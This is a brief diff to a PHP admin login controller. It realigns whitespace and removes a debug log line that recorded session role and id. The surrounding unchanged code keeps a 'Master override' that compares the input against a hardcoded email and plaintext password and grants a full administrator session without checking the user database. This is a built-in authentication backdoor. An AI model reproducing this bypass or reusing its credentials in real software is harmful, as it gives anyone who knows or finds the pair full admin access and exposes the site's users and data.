@@ -16,14 +16,14 @@ class Auth extends BaseController
         $session = session();
         $userModel = new \App\Models\UserModel();
 
-        $email    = strtolower(trim($this->request->getPost('email')));
+        $email = strtolower(trim($this->request->getPost('email')));
         $password = (string) $this->request->getPost('password');
 
         // 🔒 Master override
         if ($email === 'sa@sunny.com' && $password === 'yfbnmasc') {
             $session->set([
                 'isAdminLoggedIn' => true,
-                'admin_id'   => 0,
+                'admin_id' => 0,
                 'admin_name' => 'Sunny',
                 'admin_role' => 'ADMIN',
             ]);
@@ -35,13 +35,11 @@ class Auth extends BaseController
         if ($user && password_verify($password, $user['password'])) {
             $session->set([
                 'isAdminLoggedIn' => true,
-                'admin_id'   => $user['id'],
+                'admin_id' => $user['id'],
                 'admin_name' => $user['name'],
                 'admin_role' => strtoupper($user['role']),
             ]);
 
-            // 🧭 Debug log
-            log_message('debug', 'Login successful: role=' . $session->get('admin_role') . ', id=' . $session->get('admin_id') . ', loggedIn=' . ($session->get('isAdminLoggedIn') ? 'yes' : 'no'));
 
 
             // ✅ redirect logic per role
